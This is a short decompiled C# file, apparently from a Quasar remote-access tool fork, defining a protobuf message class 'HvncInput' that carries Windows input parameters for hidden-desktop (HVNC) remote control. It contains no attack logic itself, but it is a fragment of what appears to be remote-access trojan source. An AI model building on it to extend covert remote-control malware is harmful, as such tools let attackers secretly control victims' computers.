using System;
using ProtoBuf;
using Quasar.Common.Messages.other;

namespace Quasar.Common.Messages
{
    // Token: 0x02000056 RID: 86
    [ProtoContract]
    public class HvncInput : IMessage
    {
        // Token: 0x170000AE RID: 174
        // (get) Token: 0x060001E5 RID: 485 RVA: 0x00003E5B File Offset: 0x0000205B
        // (set) Token: 0x060001E6 RID: 486 RVA: 0x00003E63 File Offset: 0x00002063
        [ProtoMember(1)]
        public uint msg { get; set; }

        // Token: 0x170000AF RID: 175
        // (get) Token: 0x060001E7 RID: 487 RVA: 0x00003E6C File Offset: 0x0000206C
        // (set) Token: 0x060001E8 RID: 488 RVA: 0x00003E74 File Offset: 0x00002074
        [ProtoMember(2)]
        public int wParam { get; set; }

        // Token: 0x170000B0 RID: 176
        // (get) Token: 0x060001E9 RID: 489 RVA: 0x00003E7D File Offset: 0x0000207D
        // (set) Token: 0x060001EA RID: 490 RVA: 0x00003E85 File Offset: 0x00002085
        [ProtoMember(3)]
        public int lParam { get; set; }
    }
}
